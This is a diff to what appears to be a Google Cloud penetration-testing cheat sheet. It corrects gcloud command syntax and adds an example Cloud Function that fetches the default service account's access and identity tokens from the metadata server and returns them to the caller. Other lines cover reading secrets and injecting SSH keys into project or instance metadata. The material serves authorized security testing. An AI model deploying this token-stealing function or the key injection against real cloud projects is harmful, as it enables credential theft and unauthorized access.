@@ -37,7 +37,7 @@ gcloud projects list
 
 #### Set a project
 ```
-gcloud config set project <PROJECT NAME> 
+gcloud config set project <PROJECT ID> 
 ```
 
 #### Check IAM policy on project level
@@ -336,6 +336,30 @@ gcloud functions list
 - Permissions: `cloudfunctions.functions.create`, `cloudfunctions.functions.update`, `cloudfunctions.functions.call`
 - `iam.serviceAccounts.actAs` when a service account is in use
 
+#### Example code
+```
+import subprocess
+import random
+import io
+import string
+import json
+import os
+from urllib.request import Request, urlopen
+from base64 import b64decode, b64encode
+
+def hello_world(request):
+    request_json = request.get_json()
+    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
+    req.add_header('Metadata-Flavor', 'Google')
+    content = urlopen(req).read()
+    token = json.loads(content)
+    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com')
+    req.add_header('Metadata-Flavor', 'Google')
+    content = urlopen(req).read()
+    token["identity"] = content.decode("utf-8")
+    return json.dumps(token)
+```
+
 #### Create / Update existing cloud function source code
 ```
 gcloud functions deploy <CLOUD FUNCTION NAME> --timeout 539 --source <PATH TO SOURCE CODE> --runtime python37
@@ -416,12 +440,12 @@ username:ssh-rsa [AAAAB3NzaC1yc2EAAAADAQABAAABAQ]
 
 #### Set ssh key value in the project metadata
 ```
-gcloud compute project-info add-metadata --metadata-from-file=ssh-keys=<KEY FILE>
+gcloud compute project-info add-metadata --metadata-from-file ssh-keys=<KEY FILE>
 ```
 
 #### Set ssh key value in the instance metadata
 ```
-gcloud compute instances add-metadata <VM NAME> --metadata-from-file-ssh-keys=<KEY FILE>
+gcloud compute instances add-metadata <VM NAME> --metadata-from-file ssh-keys=<KEY FILE>
 ```
 
 #### Add a ssh key to existing list
@@ -460,7 +484,7 @@ curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetada
 
 #### Set service account variable for following commands
 ```
-SERVICEACCOUNT=$SERVICEACCOUNT
+SERVICEACCOUNT=<EMAIL>
 ```
 
 #### Check email
@@ -608,7 +632,7 @@ gcloud secrets versions list <SECRET>
 
 #### Read secret
 ```
-gcloud secrets versions access --secret cpsa-key-json <VERSION>
+gcloud secrets versions access --secret <SECRET> <VERSION>
 ```
 
 ## Metadata server
